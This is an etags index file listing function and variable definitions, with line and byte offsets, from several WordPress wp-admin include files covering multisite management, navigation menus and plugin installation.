function iis7_rewrite_rule_exists($filename) {iis7_rewrite_rule_exists380,10035
	$doc = new DOMDocument();doc386,10186
	$xpath = new DOMXPath($doc);xpath389,10269
	$rules = $xpath->query('/configuration/system.webServer/rewrite/rules/rule[starts-with(@name,\'wordpress\')]');rules390,10299
function iis7_delete_rewrite_rule($filename) {iis7_delete_rewrite_rule405,10657
	$doc = new DOMDocument();doc413,10908
	$xpath = new DOMXPath($doc);xpath418,11029
	$rules = $xpath->query('/configuration/system.webServer/rewrite/rules/rule[starts-with(@name,\'wordpress\')]');rules419,11059
		$child = $rules->item(0);child421,11201
		$parent = $child->parentNode;parent422,11229
function iis7_add_rewrite_rule($filename, $rewrite_rule) {iis7_add_rewrite_rule439,11624
		$fp = fopen( $filename, 'w');fp445,11834
	$doc = new DOMDocument();doc450,11920
	$xpath = new DOMXPath($doc);xpath456,12040
	$wordpress_rules = $xpath->query('/configuration/system.webServer/rewrite/rules/rule[starts-with(@name,\'wordpress\')]');wordpress_rules459,12160
	$xmlnodes = $xpath->query('/configuration/system.webServer/rewrite/rules');xmlnodes464,12418
		$rules_node = $xmlnodes->item(0);rules_node466,12527
		$rules_node = $doc->createElement('rules');rules_node468,12573
		$xmlnodes = $xpath->query('/configuration/system.webServer/rewrite');xmlnodes470,12620
			$rewrite_node = $xmlnodes->item(0);rewrite_node472,12725
			$rewrite_node = $doc->createElement('rewrite');rewrite_node475,12819
			$xmlnodes = $xpath->query('/configuration/system.webServer');xmlnodes478,12915
				$system_webServer_node = $xmlnodes->item(0);system_webServer_node480,13014
				$system_webServer_node = $doc->createElement('system.webServer');system_webServer_node483,13131
				$xmlnodes = $xpath->query('/configuration');xmlnodes486,13258
					$config_node = $xmlnodes->item(0);config_node488,13342
					$config_node = $doc->createElement('configuration');config_node491,13451
	$rule_fragment = $doc->createDocumentFragment();rule_fragment499,13622
function saveDomDocument($doc, $filename) {saveDomDocument518,13989
	$config = $doc->saveXML();config519,14033
	$config = preg_replace("/([^\r])\n/", "$1\r\n", $config);config520,14061
	$fp = fopen($filename, 'w');fp521,14120
function win_is_writable( $path ) {win_is_writable534,14315
	$should_delete_tmp_file = !file_exists( $path );should_delete_tmp_file546,14837
	$f = @fopen( $path, 'a' );f547,14887
	if ( $f === false )f548,14915
function admin_color_scheme_picker() {admin_color_scheme_picker561,15135
$current_color = get_user_option('admin_color', $user_id);current_color565,15324
	$current_color = 'fresh';current_color567,15412
foreach ( $_wp_admin_css_colors as $color => $color_info ): ?>color568,15439
function _ipad_meta() {_ipad_meta585,16073

wordpress/wp-admin/includes/ms-deprecated.php,704
function wpmu_menu() {wpmu_menu15,327
function wpmu_checkAvailableSpace() {wpmu_checkAvailableSpace26,586
function mu_options( $options ) {mu_options36,850
function activate_sitewide_plugin() {activate_sitewide_plugin45,1005
function deactivate_sitewide_plugin( $plugin = false ) {deactivate_sitewide_plugin54,1193
function deactivate_sitewide_plugin( $plugin = false ) {plugin54,1193
function is_wpmu_sitewide_plugin( $file ) {is_wpmu_sitewide_plugin63,1392
function get_site_allowed_themes() {get_site_allowed_themes68,1553
function wpmu_get_blog_allowedthemes( $blog_id = 0 ) {wpmu_get_blog_allowedthemes73,1744
function wpmu_get_blog_allowedthemes( $blog_id = 0 ) {blog_id73,1744

wordpress/wp-admin/includes/ms.php,9982
function check_upload_size( $file ) {check_upload_size18,358
	$space_allowed = 1048576 * get_space_allowed();space_allowed28,596
	$space_used = get_dirsize( BLOGUPLOADDIR );space_used29,645
	$space_left = $space_allowed - $space_used;space_left30,690
	$file_size = filesize( $file['tmp_name'] );file_size31,735
function wpmu_delete_blog( $blog_id, $drop = false ) {wpmu_delete_blog55,1725
function wpmu_delete_blog( $blog_id, $drop = false ) {drop55,1725
	$switch = false;switch58,1811
		$switch = true;switch60,1865
		$blog = get_blog_details( $blog_id );blog62,1913
		$blog = $GLOBALS['current_blog'];blog64,1963
	$users = get_users( array( 'blog_id' => $blog_id, 'fields' => 'ids' ) );users69,2050
		$drop = false;drop82,2523
		$drop_tables = apply_filters( 'wpmu_drop_tables', $wpdb->tables( 'blog' ) );drop_tables86,2558
		$dir = apply_filters( 'wpmu_delete_blog_upload_dir', WP_CONTENT_DIR . "/blogs.dir/{$blog_id}/files/", $blog_id );dir94,2808
		$dir = rtrim( $dir, DIRECTORY_SEPARATOR );dir95,2924
		$top_dir = $dir;top_dir96,2969
		$stack = array($dir);stack97,2988
		$index = 0;index98,3012
			$dir = $stack[$index];dir102,3104
			$dh = @opendir( $dir );dh104,3131
				while ( ( $file = @readdir( $dh ) ) !== false ) {file106,3174
					if ( $file == '.' || $file == '..' )file107,3228
		$stack = array_reverse( $stack ); // Last added dirs are deepeststack119,3544
function wpmu_delete_user( $id ) {wpmu_delete_user131,3786
	$id = (int) $id;id134,3837
	$user = new WP_User( $id );user135,3855
	$blogs = get_blogs_of_user( $id );blogs139,3925
			$post_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_author = %d", $id ) );post_ids146,4117
			$link_ids = $wpdb->get_col( $wpdb->prepare( "SELECT link_id FROM $wpdb->links WHERE link_owner = %d", $id ) );link_ids152,4330
	$meta = $wpdb->get_col( $wpdb->prepare( "SELECT umeta_id FROM $wpdb->usermeta WHERE user_id = %d", $id ) );meta163,4579
function update_option_new_admin_email( $old_value, $value ) {update_option_new_admin_email177,4928
	$email = get_option( 'admin_email' );email178,4991
	if ( $value == get_option( 'admin_email' ) || !is_email( $value ) )value179,5030
	$hash = md5( $value. time() .mt_rand() );hash182,5110
	$new_admin_email = array(new_admin_email183,5153
	$content = apply_filters( 'new_admin_email_content', __( "Dear user,content189,5276
	$content = str_replace( '###ADMIN_URL###', esc_url( admin_url( 'options.php?adminhash='.$hash ) ), $content );content205,5715
	$content = str_replace( '###EMAIL###', $value, $content );content206,5827
	$content = str_replace( '###SITENAME###', get_site_option( 'site_name' ), $content );content207,5887
	$content = str_replace( '###SITEURL###', network_home_url(), $content );content208,5974
function send_confirmation_on_profile_email() {send_confirmation_on_profile_email215,6328
	$current_user = wp_get_current_user();current_user217,6400
		$errors = new WP_Error();errors219,6469
		$hash = md5( $_POST['email'] . time() . mt_rand() );hash236,7137
		$new_user_email = array(new_user_email237,7192
		$content = apply_filters( 'new_user_email_content', __( "Dear user,content243,7352
		$content = str_replace( '###ADMIN_URL###', esc_url( admin_url( 'profile.php?newuseremail='.$hash ) ), $content );content258,7778
		$content = str_replace( '###EMAIL###', $_POST['email'], $content);content259,7894
		$content = str_replace( '###SITENAME###', get_site_option( 'site_name' ), $content );content260,7963
		$content = str_replace( '###SITEURL###', network_home_url(), $content );content261,8051
function new_user_email_admin_notice() {new_user_email_admin_notice269,8368
	if ( strpos( $_SERVER['PHP_SELF'], 'profile.php' ) && isset( $_GET['updated'] ) && $email = get_option( get_current_user_id() . '_new_email' ) )email270,8409
function is_upload_space_available() {is_upload_space_available281,8973
	if ( !( $space_allowed = get_upload_space_available() ) )space_allowed285,9085
function upload_size_limit_filter( $size ) {upload_size_limit_filter296,9250
	$fileupload_maxk = 1024 * get_site_option( 'fileupload_maxk', 1500 );fileupload_maxk297,9295
function get_upload_space_available() {get_upload_space_available308,9675
	$space_allowed = get_space_allowed() * 1024 * 1024;space_allowed309,9715
	$dir_name = trailingslashit( BLOGUPLOADDIR );dir_name313,9851
  	$dir = dir( $dir_name );dir317,9984
   	$size = 0;size318,10012
	while ( $file = $dir->read() ) {file320,10028
function get_space_allowed() {get_space_allowed342,10444
	$space_allowed = get_option( 'blog_upload_space' );space_allowed343,10475
		$space_allowed = get_site_option( 'blog_upload_space' );space_allowed346,10568
		$space_allowed = 50;space_allowed349,10694
function display_space_usage() {display_space_usage354,10745
	$space = get_space_allowed();space355,10778
	$used = get_dirsize( BLOGUPLOADDIR ) / 1024 / 1024;used356,10809
	$percentused = ( $used / $space ) * 100;percentused358,10863
		$space = number_format( $space / 1024 );space361,10930
function upload_space_setting( $id ) {upload_space_setting374,11266
	$quota = get_blog_option( $id, 'blog_upload_space' );quota375,11305
		$quota = '';quota377,11376
function update_user_status( $id, $pref, $value, $deprecated = null ) {update_user_status388,11723
function update_user_status( $id, $pref, $value, $deprecated = null ) {deprecated388,11723
	$wpdb->update( $wpdb->users, array( $pref => $value ), array( 'ID' => $id ) );pref394,11888
	$user = new WP_User( $id );user396,11969
	if ( $pref == 'spam' ) {pref399,12027
		if ( $value == 1 )value400,12053
function refresh_user_details( $id ) {refresh_user_details409,12181
	$id = (int) $id;id410,12220
function format_code_lang( $code = '' ) {format_code_lang420,12338
function format_code_lang( $code = '' ) {code420,12338
	$code = strtolower( substr( $code, 0, 2 ) );code421,12380
	$lang_codes = array(lang_codes422,12426
	$lang_codes = apply_filters( 'lang_codes', $lang_codes, $code );lang_codes434,16482
function sync_category_tag_slugs( $term, $taxonomy ) {sync_category_tag_slugs438,16588
	if ( global_terms_enabled() && ( $taxonomy == 'category' || $taxonomy == 'post_tag' ) ) {taxonomy439,16643
function _access_denied_splash() {_access_denied_splash450,16960
	$blogs = get_blogs_of_user( get_current_user_id() );blogs454,17058
	$blog_name = get_bloginfo( 'name' );blog_name459,17206
	$output = '<p>' . sprintf( __( 'You attempted to access the "%1$s" dashboard, but you do not currently have privileges on this site. If you believe you should be able to access the "%1$s" dashboard, please contact your network administrator.' ), $blog_name ) . '</p>';output464,17524
function check_import_new_users( $permission ) {check_import_new_users486,18593
function mu_dropdown_languages( $lang_files = array(), $current = '' ) {mu_dropdown_languages494,18858
function mu_dropdown_languages( $lang_files = array(), $current = '' ) {lang_files494,18858
	$flag = false;flag495,18931
	$output = array();output496,18947
		$code_lang = basename( $val, '.mo' );code_lang499,19011
		if ( $code_lang == 'en_US' ) { // American Englishcode_lang501,19052
			$flag = true;flag502,19105
			$ae = __( 'American English' );ae503,19122
		} elseif ( $code_lang == 'en_GB' ) { // British Englishcode_lang505,19294
			$flag = true;flag506,19352
			$be = __( 'British English' );be507,19369
			$translated = format_code_lang( $code_lang );translated510,19551
	if ( $flag === false ) // WordPress englishflag516,19775
	$output = apply_filters( 'mu_dropdown_languages', $output, $lang_files, $current );output522,19983
function secret_salt_warning() {secret_salt_warning527,20183
	$secret_keys = array( 'AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY', 'AUTH_SALT', 'SECURE_AUTH_SALT', 'LOGGED_IN_SALT', 'NONCE_SALT' );secret_keys530,20252
	$out = '';out531,20403
		$msg  = __( 'Warning! WordPress encrypts user cookies, but you must add the following lines to <strong>wp-config.php</strong> for it to be more secure.' );msg537,20601
function site_admin_notice() {site_admin_notice546,21042
function avoid_blog_page_permalink_collision( $data, $postarr ) {avoid_blog_page_permalink_collision556,21537
	$post_name = $data['post_name'];post_name566,21825
	$c = 0;c567,21859
function choose_primary_blog() {choose_primary_blog579,22154
		$all_blogs = get_blogs_of_user( get_current_user_id() );all_blogs587,22338
		$primary_blog = get_user_meta( get_current_user_id(), 'primary_blog', true );primary_blog588,22397
			$found = false;found590,22512
					if ( $primary_blog == $blog->userblog_id )primary_blog594,22620
						$found = true;found595,22668
				$blog = array_shift( $all_blogs );blog601,22925
			$blog = array_shift( $all_blogs );blog605,23094
function ms_deprecated_blogs_file() {ms_deprecated_blogs_file626,23742
function grant_super_admin( $user_id ) {grant_super_admin641,24284
	$super_admins = get_site_option( 'site_admins', array( 'admin' ) );super_admins651,24585
	$user = new WP_User( $user_id );user653,24655
function revoke_super_admin( $user_id ) {revoke_super_admin669,25009
	$super_admins = get_site_option( 'site_admins', array( 'admin' ) );super_admins679,25312
	$user = new WP_User( $user_id );user681,25382
		if ( false !== ( $key = array_search( $user->user_login, $super_admins ) ) ) {key683,25480
function can_edit_network( $site_id ) {can_edit_network701,26007
		$result = true;result705,26096
		$result = false;result707,26120
function _thickbox_path_admin_subfolder() {_thickbox_path_admin_subfolder718,26296
function wp_is_large_network( $using = 'sites' ) {wp_is_large_network739,26951
function wp_is_large_network( $using = 'sites' ) {using739,26951
		$count = get_user_count();count741,27030
	$count = get_blog_count();count745,27145

wordpress/wp-admin/includes/nav-menu.php,12435
class Walker_Nav_Menu_Edit extends Walker_Nav_Menu {Walker_Nav_Menu_Edit10,126
	function start_lvl(&$output) {}start_lvl17,295
	function end_lvl(&$output) {end_lvl25,443
	function start_el(&$output, $item, $depth, $args) {start_el37,749
		$_wp_nav_menu_max_depth = $depth > $_wp_nav_menu_max_depth ? $depth : $_wp_nav_menu_max_depth;_wp_nav_menu_max_depth39,836
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';indent41,934
		$item_id = esc_attr( $item->ID );item_id44,1007
		$removed_args = array(removed_args45,1043
		$original_title = '';original_title54,1175
			$original_title = get_term_field( 'name', $item->object_id, $item->object, 'raw' );original_title56,1236
				$original_title = false;original_title58,1364
			$original_object = get_post( $item->object_id );original_object60,1437
			$original_title = $original_object->post_title;original_title61,1489
		$classes = array(classes64,1545
			'menu-item-edit-' . ( ( isset( $_GET['edit-menu-item'] ) && $item_id == $_GET['edit-menu-item'] ) ? 'active' : 'inactive'),item_id67,1652
		$title = $item->title;title70,1785
			$title = sprintf( __( '%s (Invalid)' ), $item->title );title75,1948
			$title = sprintf( __('%s (Pending)'), $item->title );title79,2173
		$title = empty( $item->label ) ? $title : $item->label;title82,2235
							echo ( isset( $_GET['edit-menu-item'] ) && $item_id == $_GET['edit-menu-item'] ) ? admin_url( 'nav-menus.php' ) : add_query_arg( 'edit-menu-item', $item_id, remove_query_arg( $removed_args, admin_url( 'nav-menus.php#menu-item-settings-' . $item_id ) ) );item_id119,3639
class Walker_Nav_Menu_Checklist extends Walker_Nav_Menu {Walker_Nav_Menu_Checklist212,9427
	function __construct( $fields = false ) {__construct213,9485
	function __construct( $fields = false ) {fields213,9485
			$this->db_fields = $fields;db_fields215,9547
	function start_lvl( &$output, $depth ) {start_lvl219,9586
		$indent = str_repeat( "\t", $depth );indent220,9628
	function end_lvl( &$output, $depth ) {end_lvl224,9721
		$indent = str_repeat( "\t", $depth );indent225,9761
	function start_el(&$output, $item, $depth, $args) {start_el238,10108
		$_nav_menu_placeholder = ( 0 > $_nav_menu_placeholder ) ? intval($_nav_menu_placeholder) - 1 : -1;_nav_menu_placeholder241,10195
		$possible_object_id = isset( $item->post_type ) && 'nav_menu_item' == $item->post_type ? $item->object_id : $_nav_menu_placeholder;possible_object_id242,10296
		$possible_db_id = ( ! empty( $item->ID ) ) && ( 0 < $possible_object_id ) ? (int) $item->ID : 0;possible_db_id243,10430
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';indent245,10530
function _wp_ajax_menu_quick_search( $request = array() ) {_wp_ajax_menu_quick_search278,12936
function _wp_ajax_menu_quick_search( $request = array() ) {request278,12936
	$args = array();args279,12996
	$type = isset( $request['type'] ) ? $request['type'] : '';type280,13014
	$object_type = isset( $request['object_type'] ) ? $request['object_type'] : '';object_type281,13074
	$query = isset( $request['q'] ) ? $request['q'] : '';query282,13155
	$response_format = isset( $request['response-format'] ) && in_array( $request['response-format'], array( 'json', 'markup' ) ) ? $request['response-format'] : 'json';response_format283,13210
				$object_id = (int) $request['ID'];object_id292,13587
					$post_obj = get_post( $object_id );post_obj296,13836
				$object_id = (int) $request['ID'];object_id309,14171
					$post_obj = get_term( $object_id, $object_type );post_obj313,14434
					$var_by_ref = get_the_ID();var_by_ref339,15082
			$terms = get_terms( $matches[2], array(terms353,15514
function wp_nav_menu_setup() {wp_nav_menu_setup382,16182
		$user = wp_get_current_user();user395,16846
function wp_initial_nav_menu_meta_boxes() {wp_initial_nav_menu_meta_boxes407,17158
	$initial_meta_boxes = array( 'nav-menu-theme-locations', 'add-custom-links', 'add-page', 'add-category' );initial_meta_boxes413,17331
	$hidden_meta_boxes = array();hidden_meta_boxes414,17439
	$user = wp_get_current_user();user428,17846
function wp_nav_menu_post_type_meta_boxes() {wp_nav_menu_post_type_meta_boxes437,18045
	$post_types = get_post_types( array( 'show_in_nav_menus' => true ), 'object' );post_types438,18091
		$post_type = apply_filters( 'nav_menu_meta_box_object', $post_type );post_type444,18247
			$id = $post_type->name;id446,18341
function wp_nav_menu_taxonomy_meta_boxes() {wp_nav_menu_taxonomy_meta_boxes457,18595
	$taxonomies = get_taxonomies( array( 'show_in_nav_menus' => true ), 'object' );taxonomies458,18640
		$tax = apply_filters( 'nav_menu_meta_box_object', $tax );tax464,18789
			$id = $tax->name;id466,18865
function wp_nav_menu_locations_meta_box() {wp_nav_menu_locations_meta_box477,19107
	$locations = get_registered_nav_menus();locations486,19516
	$menus = wp_get_nav_menus();menus487,19558
	$menu_locations = get_nav_menu_locations();menu_locations488,19588
	$num_locations = count( array_keys($locations) );num_locations489,19633
	foreach ( $locations as $location => $description ) {location493,19941
						$truncated_name = wp_html_excerpt( $menu->name, 40 );truncated_name503,20468
						echo $truncated_name == $menu->name ? $menu->name : trim( $truncated_name ) . '&hellip;';truncated_name504,20528
function wp_nav_menu_item_link_meta_box() {wp_nav_menu_item_link_meta_box525,21071
	$_nav_menu_placeholder = 0 > $_nav_menu_placeholder ? $_nav_menu_placeholder - 1 : -1;_nav_menu_placeholder527,21170
	$current_tab = 'create';current_tab529,21259
		$current_tab = $_REQUEST['customlink-tab'];current_tab531,21399
	$removed_args = array(removed_args534,21449
function wp_nav_menu_item_post_type_meta_box( $object, $post_type ) {wp_nav_menu_item_post_type_meta_box580,23043
	$post_type_name = $post_type['args']->name;post_type_name583,23169
	$per_page = 50;per_page586,23271
	$pagenum = isset( $_REQUEST[$post_type_name . '-tab'] ) && isset( $_REQUEST['paged'] ) ? absint( $_REQUEST['paged'] ) : 1;pagenum587,23288
	$offset = 0 < $pagenum ? $per_page * ( $pagenum - 1 ) : 0;offset588,23412
	$args = array(args590,23473
		$args = array_merge($args, (array) $post_type['args']->_default_query );args602,23783
	$get_posts = new WP_Query;get_posts605,23964
	$posts = $get_posts->query( $args );posts606,23992
	$post_type_object = get_post_type_object($post_type_name);post_type_object612,24122
	$num_pages = $get_posts->max_num_pages;num_pages614,24183
	$page_links = paginate_links( array(page_links616,24225
		$error = '<li id="error">'. $post_type['args']->labels->not_found .'</li>';error633,24594
	$db_fields = false;db_fields635,24673
		$db_fields = array( 'parent' => 'post_parent', 'id' => 'ID' );db_fields637,24749
	$walker = new Walker_Nav_Menu_Checklist( $db_fields );walker640,24818
	$current_tab = 'most-recent';current_tab642,24875
		$current_tab = $_REQUEST[$post_type_name . '-tab'];current_tab644,25036
		$current_tab = 'search';current_tab648,25169
	$removed_args = array(removed_args651,25200
				$recent_args = array_merge( $args, array( 'orderby' => 'post_date', 'order' => 'DESC', 'posts_per_page' => 15 ) );recent_args673,26803
				$most_recent = $get_posts->query( $recent_args );most_recent674,26922
				$searched = esc_attr( $_REQUEST['quick-search-posttype-' . $post_type_name] );searched686,27424
				$search_results = get_posts( array( 's' => $searched, 'post_type' => $post_type_name, 'fields' => 'all', 'order' => 'DESC', ) );search_results687,27507
				$searched = '';searched689,27652
				$search_results = array();search_results690,27672
					$front_page = 'page' == get_option('show_on_front') ? (int) get_option( 'page_on_front' ) : 0;front_page727,29528
						$front_page_obj = get_post( $front_page );front_page_obj729,29665
						$_nav_menu_placeholder = ( 0 > $_nav_menu_placeholder ) ? intval($_nav_menu_placeholder) - 1 : -1;_nav_menu_placeholder734,29935
				$posts = apply_filters( 'nav_menu_items_'.$post_type_name, $posts, $args, $post_type );posts750,30445
				$checkbox_items = walk_nav_menu_tree( array_map('wp_setup_nav_menu_item', $posts), 0, (object) $args );checkbox_items751,30537
					$checkbox_items = preg_replace('/(type=(.)checkbox(\2))/', '$1 checked=$2checked$2', $checkbox_items);checkbox_items754,30718
function wp_nav_menu_item_taxonomy_meta_box( $object, $taxonomy ) {wp_nav_menu_item_taxonomy_meta_box799,32016
	$taxonomy_name = $taxonomy['args']->name;taxonomy_name801,32115
	$per_page = 50;per_page804,32210
	$pagenum = isset( $_REQUEST[$taxonomy_name . '-tab'] ) && isset( $_REQUEST['paged'] ) ? absint( $_REQUEST['paged'] ) : 1;pagenum805,32227
	$offset = 0 < $pagenum ? $per_page * ( $pagenum - 1 ) : 0;offset806,32350
	$args = array(args808,32411
	$terms = get_terms( $taxonomy_name, $args );terms821,32653
	$num_pages = ceil( wp_count_terms( $taxonomy_name , array_merge( $args, array('number' => '', 'offset' => '') ) ) / $per_page );num_pages828,32799
	$page_links = paginate_links( array(page_links830,32930
	$db_fields = false;db_fields846,33280
		$db_fields = array( 'parent' => 'parent', 'id' => 'term_id' );db_fields848,33354
	$walker = new Walker_Nav_Menu_Checklist( $db_fields );walker851,33423
	$current_tab = 'most-used';current_tab853,33480
		$current_tab = $_REQUEST[$taxonomy_name . '-tab'];current_tab855,33650
		$current_tab = 'search';current_tab859,33781
	$removed_args = array(removed_args862,33812
				$popular_terms = get_terms( $taxonomy_name, array( 'orderby' => 'count', 'order' => 'DESC', 'number' => 10, 'hierarchical' => false ) );popular_terms884,35367
				$searched = esc_attr( $_REQUEST['quick-search-taxonomy-' . $taxonomy_name] );searched917,36749
				$search_results = get_terms( $taxonomy_name, array( 'name__like' => $searched, 'fields' => 'all', 'orderby' => 'count', 'order' => 'DESC', 'hierarchical' => false ) );search_results918,36831
				$searched = '';searched920,37015
				$search_results = array();search_results921,37035
function wp_save_nav_menu_items( $menu_id = 0, $menu_data = array() ) {wp_save_nav_menu_items976,39346
function wp_save_nav_menu_items( $menu_id = 0, $menu_data = array() ) {menu_id976,39346
	$menu_id = (int) $menu_id;menu_id977,39418
	$items_saved = array();items_saved978,39446
		foreach( (array) $menu_data as $_possible_db_id => $_item_object_data ) {_possible_db_id983,39574
				$_actual_db_id = 0;_actual_db_id1002,40572
				$_actual_db_id = (int) $_item_object_data['menu-item-db-id'];_actual_db_id1004,40608
			$args = array(args1007,40680
function _wp_nav_menu_meta_box_object( $object = null ) {_wp_nav_menu_meta_box_object1040,42698
function _wp_nav_menu_meta_box_object( $object = null ) {object1040,42698
function wp_get_nav_menu_to_edit( $menu_id = 0 ) {wp_get_nav_menu_to_edit1081,43666
function wp_get_nav_menu_to_edit( $menu_id = 0 ) {menu_id1081,43666
	$menu = wp_get_nav_menu_object( $menu_id );menu1082,43717
		$menu_items = wp_get_nav_menu_items( $menu->term_id, array('post_status' => 'any') );menu_items1086,43833
		$result = '<div id="menu-instructions" class="post-body-plain';result1087,43921
		$walker_class_name = apply_filters( 'wp_edit_nav_menu_walker', 'Walker_Nav_Menu_Edit', $menu_id );walker_class_name1095,44326
			$walker = new $walker_class_name;walker1098,44472
			return new WP_Error( 'menu_walker_not_exist', sprintf( __('The Walker class named <strong>%s</strong> does not exist.'), $walker_class_name ) );named1100,44516
		$some_pending_menu_items = $some_invalid_menu_items = false;some_pending_menu_items1102,44665
				$some_pending_menu_items = true;some_pending_menu_items1105,44858
				$some_invalid_menu_items = true;some_invalid_menu_items1107,44937
function wp_nav_menu_manage_columns() {wp_nav_menu_manage_columns1133,45754
function _wp_delete_orphaned_draft_menu_items() {_wp_delete_orphaned_draft_menu_items1151,46148
	$delete_timestamp = time() - (60*60*24*EMPTY_TRASH_DAYS);delete_timestamp1153,46213
	$menu_items_to_delete = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts AS p LEFT JOIN $wpdb->postmeta AS m ON p.ID = m.post_id WHERE post_type = 'nav_menu_item' AND post_status = 'draft' AND meta_key = '_menu_item_orphaned' AND meta_value < '%d'", $delete_timestamp ) );menu_items_to_delete1156,46310

wordpress/wp-admin/includes/plugin-install.php,5587
function plugins_api($action, $args = null) {plugins_api29,926
function plugins_api($action, $args = null) {args29,926
		$args = (object)$args;args32,997
	$args = apply_filters('plugins_api_args', $args, $action);args40,1279
	$res = apply_filters('plugins_api', false, $action, $args);res41,1339
		$request = wp_remote_post('http://api.wordpress.org/plugins/info/1.0/', array( 'timeout' => 15, 'body' => array('action' => $action, 'request' => serialize($args))) );request44,1426
			$res = new WP_Error('plugins_api_failed', __( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="http://wordpress.org/support/">support forums</a>.' ), $request->get_error_message() );res46,1629
			$res = maybe_unserialize( wp_remote_retrieve_body( $request ) );res48,1946
				$res = new WP_Error('plugins_api_failed', __( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="http://wordpress.org/support/">support forums</a>.' ), wp_remote_retrieve_body( $request ) );res50,2066
function install_popular_tags( $args = array() ) {install_popular_tags67,2629
function install_popular_tags( $args = array() ) {args67,2629
	$key = md5(serialize($args));key68,2680
	$tags = plugins_api('hot_tags', $args);tags72,2795
function install_dashboard() {install_dashboard82,2977
	$api_tags = install_popular_tags();api_tags93,3588
		$tags = array();tags100,3823
function install_search_form( $type_selector = true ) {install_search_form118,4463
function install_search_form( $type_selector = true ) {type_selector118,4463
	$type = isset($_REQUEST['type']) ? stripslashes( $_REQUEST['type'] ) : 'term';type119,4519
	$term = isset($_REQUEST['s']) ? stripslashes( $_REQUEST['s'] ) : '';term120,4599
function install_plugins_upload( $page = 1 ) {install_plugins_upload143,5518
function install_plugins_upload( $page = 1 ) {page143,5518
function display_plugins_table() {display_plugins_table162,6314
function install_plugin_install_status($api, $loop = false) {install_plugin_install_status177,6736
function install_plugin_install_status($api, $loop = false) {loop177,6736
	// this function is called recursively, $loop prevents further loops.is178,6798
		$api = (object) $api;api180,6892
	$status = 'install';status183,6946
	$url = false;url184,6968
	$update_plugins = get_site_transient('update_plugins');update_plugins187,7072
		foreach ( (array)$update_plugins->response as $file => $plugin ) {file189,7174
				$status = 'update_available';status191,7284
				$update_file = $file;update_file192,7318
				$version = $plugin->new_version;version193,7344
					$url = wp_nonce_url(self_admin_url('update.php?action=upgrade-plugin&plugin=' . $update_file), 'upgrade-plugin_' . $update_file);url195,7427
			$installed_plugin = get_plugins('/' . $api->slug);installed_plugin203,7671
					$url = wp_nonce_url(self_admin_url('update.php?action=install-plugin&plugin=' . $api->slug), 'install-plugin_' . $api->slug);url206,7809
				$key = array_shift( $key = array_keys($installed_plugin) ); //Use the first plugin regardless of the name, Could have issues for multiple-plugins in one directory if they share different version numberskey208,7952
					$status = 'latest_installed';status210,8245
					$status = 'newer_installed';status212,8373
					$version = $installed_plugin[ $key ]['Version'];version213,8407
				$url = wp_nonce_url(self_admin_url('update.php?action=install-plugin&plugin=' . $api->slug), 'install-plugin_' . $api->slug);url226,8882
function install_plugin_information() {install_plugin_information240,9239
	$api = plugins_api('plugin_information', array('slug' => stripslashes( $_REQUEST['plugin'] ) ));api243,9294
	$plugins_allowedtags = array(plugins_allowedtags248,9436
	$plugins_section_titles = array(plugins_section_titles257,9976
	foreach ( (array)$api->sections as $section_name => $content )section_name267,10475
	$section = isset($_REQUEST['section']) ? stripslashes( $_REQUEST['section'] ) : 'description'; //Default to the Description tab, Do not translate, API returns English.section274,10816
		$section = array_shift( $section_titles = array_keys((array)$api->sections) );section276,11048
	foreach ( (array)$api->sections as $section_name => $content ) {section_name281,11234
			$title = $plugins_section_titles[ $section_name ];title284,11360
			$title = ucwords( str_replace( '_', ' ', $section_name ) );title286,11421
		$class = ( $section_name == $section ) ? ' class="current"' : '';class288,11485
		$href = add_query_arg( array('tab' => $tab, 'section' => $section_name) );href289,11553
		$href = esc_url($href);href290,11630
		$san_section = esc_attr( $section_name );san_section291,11656
		$status = install_plugin_install_status($api);status301,12015
		foreach ( (array)$api->sections as $section_name => $content ) {section_name358,15428
				$title = $plugins_section_titles[ $section_name ];title361,15556
				$title = ucwords( str_replace( '_', ' ', $section_name ) );title363,15619
			$content = links_add_base_url($content, 'http://wordpress.org/extend/plugins/' . $api->slug . '/');content365,15684
			$content = links_add_target($content, '_blank');content366,15787
			$san_section = esc_attr( $section_name );san_section368,15840
			$display = ( $section_name == $section ) ? 'block' : 'none';display370,15886

wordpress/wp-admin/includes/plugin.php,22428
 * for want is usually the first 1kiB or 2kiB. This function stops pulling instops52,2168
function get_plugin_data( $plugin_file, $markup = true, $translate = true ) {get_plugin_data72,3166
function get_plugin_data( $plugin_file, $markup = true, $translate = true ) {markup72,3166
	$default_headers = array(default_headers74,3245
	$plugin_data = get_file_data( $plugin_file, $default_headers, 'plugin' );plugin_data88,3632
		$plugin_data = _get_plugin_data_markup_translate( $plugin_file, $plugin_data, $markup, $translate );plugin_data99,4220
function _get_plugin_data_markup_translate( $plugin_file, $plugin_data, $markup = true, $translate = true ) {_get_plugin_data_markup_translate115,4615
function _get_plugin_data_markup_translate( $plugin_file, $plugin_data, $markup = true, $translate = true ) {markup115,4615
		if ( $textdomain = $plugin_data['TextDomain'] ) {textdomain119,4768
			$textdomain = 'default';textdomain125,5135
	$allowed_tags = $allowed_tags_in_links = array(allowed_tags134,5400
function get_plugin_files($plugin) {get_plugin_files182,7287
	$plugin_file = WP_PLUGIN_DIR . '/' . $plugin;plugin_file183,7324
	$dir = dirname($plugin_file);dir184,7371
	$plugin_files = array($plugin);plugin_files185,7402
		$plugins_dir = @ opendir( $dir );plugins_dir187,7483
					$plugins_subdir = @ opendir( $dir . '/' . $file );plugins_subdir193,7697
function get_plugins($plugin_folder = '') {get_plugins234,9176
	if ( ! $cache_plugins = wp_cache_get('plugins', 'plugins') )cache_plugins236,9221
		$cache_plugins = array();cache_plugins237,9283
	$wp_plugins = array ();wp_plugins242,9404
	$plugin_root = WP_PLUGIN_DIR;plugin_root243,9429
	$plugins_dir = @ opendir( $plugin_root);plugins_dir248,9568
	$plugin_files = array();plugin_files249,9610
				$plugins_subdir = @ opendir( $plugin_root.'/'.$file );plugins_subdir255,9813
